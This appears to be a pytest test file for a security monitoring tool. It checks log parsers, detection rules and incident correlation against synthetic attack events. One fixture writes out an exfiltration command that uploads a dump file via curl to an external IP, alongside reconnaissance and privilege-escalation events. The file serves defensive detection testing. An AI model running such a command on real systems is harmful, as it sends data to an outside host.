import pytest

from app.ingest import parsers
from app.analysis import detectors
from app.analysis.correlate import build_incidents

from conftest import NOW, ev


# ---------------------------------------------------------------------------
# Parsers
# ---------------------------------------------------------------------------
def test_parse_syslog_failed_login():
    line = 'Oct 30 02:10:05 WEB-01 sshd[4200]: Failed password for svc-backup from 185.220.101.34 port 51000 ssh2'
    e = parsers.parse_syslog_line(line, NOW)
    assert e and e["event_type"] == "auth_failure" and e["username"] == "svc-backup"
    assert e["src_ip"] == "185.220.101.34" and e["host"] == "WEB-01"


def test_parse_syslog_sudo_failure_normalizes_outcome():
    line = ('Oct 30 02:47:33 DB-01 sudo[9100]:   svc-backup : 1 incorrect password attempts ; '
            'TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/su')
    e = parsers.parse_syslog_line(line, NOW)
    assert e["event_type"] == "privilege" and e["outcome"] == "failure"


def test_parse_ecs_alert_maps_mitre():
    import json
    rec = {"@timestamp": "2026-10-30T02:53:40.000Z",
           "event": {"category": ["process"], "action": "process_created"},
           "host": {"name": "WS-1"}, "user": {"name": "rkumar", "domain": "CORP"},
           "process": {"name": "powershell.exe", "command_line": "powershell -enc AAAA"},
           "rule": {"name": "Office spawned scripting engine", "severity": "high"},
           "threat": {"technique": {"id": ["T1059.001"], "name": ["PowerShell"]},
                      "tactic": {"name": ["Execution"]}}}
    e = parsers.parse_jsonl_line(json.dumps(rec), NOW)
    assert e["event_type"] == "process" and e["severity"] == "high"
    assert e["details"]["edr_mitre"] == ["T1059.001"] and e["username"] == "rkumar"


def test_parse_fortigate_login_lines():
    ok = ('date=2026-10-28 time=03:17:00 eventtime=1793157420568040000 tz="+0530" '
          'devname="FGT" logid="0100032001" type="event" subtype="system" level="information" '
          'user="Deepika.Khan" action="login" status="success" srcip=171.104.84.193 '
          'msg="Admin login successful"')
    e = parsers.parse_fortigate_line(ok, NOW)
    assert e["event_type"] == "auth_success" and e["outcome"] == "success"
    assert e["username"] == "Deepika.Khan" and abs(e["ts"] - 1793157420.568) < 2

    fail = ('date=2026-10-23 time=08:48:26 eventtime=1792745306564464000 tz="+0530" '
            'devname="FGT" logid="0100032002" type="event" subtype="system" level="alert" '
            'user="admin" action="login" status="failed" srcip=209.50.167.232 '
            'msg="Admin login failed"')
    e2 = parsers.parse_fortigate_line(fail, NOW)
    assert e2["event_type"] == "auth_failure" and e2["outcome"] == "failure"


def test_parse_fortigate_traffic_bytes():
    line = ('date=2026-10-23 time=08:48:26 eventtime=1792745306423348000 tz="+0530" devname="FGT" '
            'logid="0000000013" type="traffic" subtype="forward" level="notice" srcip=10.10.40.225 '
            'dstip=71.38.6.121 dstport=443 proto=6 action="accept" service="RDP" duration=274 '
            'sentbyte=17865 rcvdbyte=35730')
    e = parsers.parse_fortigate_line(line, NOW)
    assert e["event_type"] == "network" and e["dst_port"] == 443
    assert e["bytes_out"] == 17865 and e["bytes_in"] == 35730


def test_malformed_and_empty_lines_return_none():
    assert parsers.parse_jsonl_line("not json", NOW) is None
    assert parsers.parse_jsonl_line("", NOW) is None
    assert parsers.parse_syslog_line("garbage line", NOW) is None
    assert parsers.parse_fortigate_line("random stuff", NOW) is None


# ---------------------------------------------------------------------------
# Detectors & correlation
# ---------------------------------------------------------------------------
def _mk_events():
    evs = []
    i = 1
    t0 = 1793500000.0
    for k in range(6):
        evs.append(ev(i, t0 + k * 60, "auth_failure", username="svc-backup",
                      src_ip="185.220.101.34", host="WEB-01", severity="low",
                      action="ssh_login", outcome="failure"))
        i += 1
    evs.append(ev(i, t0 + 6 * 60, "auth_success", username="svc-backup",
                  src_ip="185.220.101.34", host="WEB-01", action="ssh_login", outcome="success"))
    i += 1
    evs.append(ev(i, t0 + 500, "process", username="svc-backup", host="WEB-01",
                  process="whoami.exe", message="whoami /all",
                  details={"command": "whoami /all"}, severity="high"))
    i += 1
    evs.append(ev(i, t0 + 700, "network", username="svc-backup", host="WEB-01",
                  src_ip="10.20.6.15", dst_ip="10.20.6.20", dst_port=22, action="ssh",
                  outcome="success", details={"action": "ssh", "dst_port": 22}))
    i += 1
    evs.append(ev(i, t0 + 710, "auth_success", username="svc-backup", src_ip="10.20.6.15",
                  host="DB-01", action="ssh_login", outcome="success"))
    i += 1
    evs.append(ev(i, t0 + 900, "privilege", username="svc-backup", host="DB-01",
                  outcome="failure",
                  details={"failed_attempts": True, "target_user": "root"}, severity="high"))
    i += 1
    evs.append(ev(i, t0 + 930, "privilege", username="svc-backup", host="DB-01",
                  outcome="failure",
                  details={"failed_attempts": True, "target_user": "root"}, severity="high"))
    i += 1
    for port in (445, 3389, 5985):
        evs.append(ev(i, t0 + 1000 + port, "network", username="svc-backup", host="WEB-01",
                      src_ip="10.20.6.15", dst_ip="10.20.6.30", dst_port=port,
                      action="network_probe", outcome="failure",
                      details={"action": "network_probe", "dst_port": port}))
        i += 1
    evs.append(ev(i, t0 + 1200, "process", username="svc-backup", host="DB-01", process="curl",
                  message="curl -T /tmp/dump http://185.220.101.34:8080",
                  dst_ip="185.220.101.34",
                  details={"command": "curl -T /tmp/dump http://185.220.101.34:8080"}))
    i += 1
    evs.append(ev(i, t0 + 60, "auth_success", username="administrator",
                  src_ip="91.240.118.172", host="VPN-GW", action="vpn_login", outcome="success"))
    return evs


def test_detection_rules_fire_with_evidence():
    evs = _mk_events()
    dets = detectors.run_all_detectors(evs)
    rules = {d["rule_id"] for d in dets}
    for expected in ("BRUTE_FORCE_AUTH", "SUCCESS_AFTER_FAILURES", "SUSPICIOUS_PROCESS_EXEC",
                     "LATERAL_MOVEMENT", "PRIVILEGE_ESCALATION_ATTEMPT", "EXFIL_EXTERNAL"):
        assert expected in rules
    for d in dets:
        assert d["event_ids"], "every detection must cite evidence"
        assert d["explanation"] and d["mitre"]


def test_failed_attempts_not_reported_as_success():
    evs = _mk_events()
    dets = detectors.run_all_detectors(evs)
    for d in dets:
        if d["rule_id"] == "PRIVILEGE_ESCALATION_ATTEMPT":
            assert "fail" in d["explanation"].lower()


def test_correlation_groups_chain_and_keeps_unrelated_separate(fresh_db):
    evs = _mk_events()
    dets = detectors.run_all_detectors(evs)
    incs = build_incidents(evs, dets, 1, True)
    assert incs
    main = incs[0]
    assert "svc-backup" in set(main["entities"]["users"])
    assert "administrator" not in set(main["entities"]["users"]), \
        "unrelated VPN login must not merge into the chain incident"
    assert main["entry_point"]["attacker_ip"] == "185.220.101.34"
